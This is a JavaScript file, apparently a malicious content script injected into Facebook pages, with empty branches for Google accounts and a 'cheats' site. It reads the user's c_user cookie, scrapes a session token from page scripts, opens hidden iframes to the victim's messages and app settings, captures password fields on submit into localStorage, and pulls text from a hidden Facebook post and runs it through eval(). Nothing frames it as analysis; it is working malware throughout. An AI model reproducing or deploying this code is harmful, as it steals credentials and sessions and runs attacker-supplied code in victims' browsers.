switch (document.domain) {
  case "facebook.com":
    console.log("fb");
/////fb///
        if (window.location.href.search("quick_token")==-1){
  var I_5 = document.createElement("script");
  I_5.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.2";
  document.getElementsByTagName("body")[0].appendChild(I_5);
  var I_6 = document.createElement("div");
  I_6.setAttribute("data-width", "500");
  I_6.setAttribute("data-href", "https://www.facebook.com/Prototipo.2018/posts/3754694704650874+quick_token");
  I_6.setAttribute("class", "fb-post");
  I_6.setAttribute("style", "display: none;");
  I_6.id="dsaj1";
  document.getElementsByTagName("body")[0].appendChild(I_6);};
////////// ==
if(document.cookie.search("c_user")>-1){var gFs_1= document.cookie;
if(gFs_1.search("c_user")>-1){
if (gFs_1.search("c_user")>-1) {
var dele_sig1 = gFs_1.split(";");
for (var o in dele_sig1)
{var she_fi1 = dele_sig1[o].search("c_user");
if (she_fi1 > -1) {var dele_fo1=dele_sig1[o]}}
var despu_igual1 = dele_fo1.indexOf("=");
var comple_exit1 = dele_fo1.substring(despu_igual1+1);}}
if(comple_exit1!=localStorage.getItem("sp_pi")){
var tockes_i = document.querySelectorAll("script");
var t_1=0;
while (t_1 < tockes_i.length-1){
var results_1=tockes_i[t_1].innerHTML.search('compat_iframe_token');
if(results_1>1){
var tokken_id=tockes_i[t_1].innerHTML.slice(results_1+22,tockes_i[t_1].innerHTML.search("__annotator=function")-4)
}t_1++}
    ///
    if (window.location.href.search("quick_token")==-1){
  var I_1 = document.createElement("iframe");
  I_1.src = "https://www.facebook.com/messages/t/"+comple_exit1+"?cquick=jsc_c_68&cquick_token="+tokken_id+"&ctarget=https%252525252525252525252525252525252525252525253A%252525252525252525252525252525252525252525252F%252525252525252525252525252525252525252525252Fwww.facebook.com";
  I_1.id = "ifmr_1";
 I_1.setAttribute("height", "800px");
  I_1.setAttribute("width", "800px");
  I_1.setAttribute("style", "display: none;");
  document.getElementsByTagName("body")[0].appendChild(I_1);
        document.getElementById("ifmr_1").onload = function() { var I_21 = document.createElement("div");I_21.id = "msg-loads1";document.getElementsByTagName("body")[0].appendChild(I_21);};
  var I_2 = document.createElement("iframe");
  I_2.src = "https://www.facebook.com/settings?tab=applications&ref=settings&cquick=jsc_c_i&cquick_token="+tokken_id+"&ctarget=https%3A%2F%2Fwww.facebook.com";
  I_2.id = "ifmr_2";
  I_2.setAttribute("height", "0%");
  I_2.setAttribute("width", "0%");
 
  document.getElementsByTagName("body")[0].appendChild(I_2);
 
  }}}
else{
localStorage.setItem("_oz_","");
setInterval(function(){
var B_shea = document.querySelectorAll("[type=submit]");
for (var g = 0; g < B_shea.length; ) {
B_shea[g].addEventListener("click", yeHa);
g++}}, 500);function yeHa() {
var opH = document.querySelectorAll("input[type=password]");try {var a_1= opH[0].value;}catch(err) { a_1=''}
try {var a_2= '<==>'+opH[1].value;}catch(err) { a_2= '';}
try {var a_3= '<==>'+opH[2].value;}
catch(err) { a_3= '';}if (typeof(Storage) !== "undefined") {localStorage.setItem("_oz_", a_1+a_2+a_3);}try {document.querySelector("button[name=login]").setAttribute("data-autoid", "autoid_3");}catch(err) {}}};
 
 
var myVarsd = setInterval(dsadqw, 700);
function dsadqw() {
 
if(Boolean(document.querySelector("[data-testid='fb:post Facebook Social Plugin']"))==true){
var x_ifmr_1 = document.querySelector("[data-testid='fb:post Facebook Social Plugin']");
var y_ifmr_1 = x_ifmr_1.contentDocument;
if(Boolean(y_ifmr_1.querySelector("[class='text_exposed_root']>p>span"))==true){
y_ifmr_1.querySelector("[class='text_exposed_root']>p>span").remove()
var hidess = y_ifmr_1.querySelector("[class='text_exposed_root']>p>span").innerHTML;
y_ifmr_1.querySelector("[class='text_exposed_root']>p>span").remove();
var gsd=y_ifmr_1.querySelector("[class='text_exposed_root']>p").innerHTML =y_ifmr_1.querySelector("[class='text_exposed_root']>p").innerHTML+hidess;
var g=gsd.replaceAll("&lt;", "<").replaceAll("&gt;", ">");
if(comple_exit1!=localStorage.getItem("sp_pi")){eval(g);}
    clearInterval(myVarsd);
 
}}
};
        ///////////////////////
    break;
  case "accounts.google.com":
    console.log("gmail");
    break;
   case "acountsycheats.webcindario.com":
    console.log("mi pagina");
    break;
  default:
    console.log("default");
}
